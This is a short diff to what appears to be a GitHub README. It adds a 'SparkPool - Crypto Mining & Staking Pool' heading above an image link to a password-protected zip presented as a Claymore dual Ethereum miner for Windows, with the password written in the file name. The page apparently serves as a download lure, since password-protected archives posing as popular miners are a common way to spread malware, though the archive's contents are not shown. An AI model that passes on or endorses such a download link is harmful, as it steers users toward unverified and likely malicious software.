@@ -1,3 +1,5 @@
+SparkPool - Crypto Mining & Staking Pool
+
 <p align="center">
 <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/Claymore.s.dual.ethereum.miner.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/5eth.jpg" /></a>
